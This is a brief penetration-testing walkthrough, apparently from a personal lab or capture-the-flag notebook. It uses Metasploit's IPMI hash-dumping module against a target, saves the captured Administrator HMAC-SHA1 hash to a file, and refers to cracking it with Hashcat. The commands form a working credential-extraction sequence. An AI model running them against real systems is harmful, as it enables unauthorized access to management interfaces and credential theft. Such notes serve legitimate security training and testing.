```bash - kali
msfconsole
```

```bash - kali
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

```bash - kali
set RHOSTS $TARGET 
```

```bash - kali
run
```

The hash for user Administrator is retrieved. Let's save it in a file and use Hashcat to attempt to crack the hash.
```bash - kali
echo -n 3c08a6bf020500008edc65459227db9e4de83261ee2eafe9429a07eb96d30b745fef6f821dd97d81a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:80026d133489237175ee975d5dff53f4c923b396 > hash 
```

![[Hashcat#IPMI2 RAKP HMAC-SHA1]]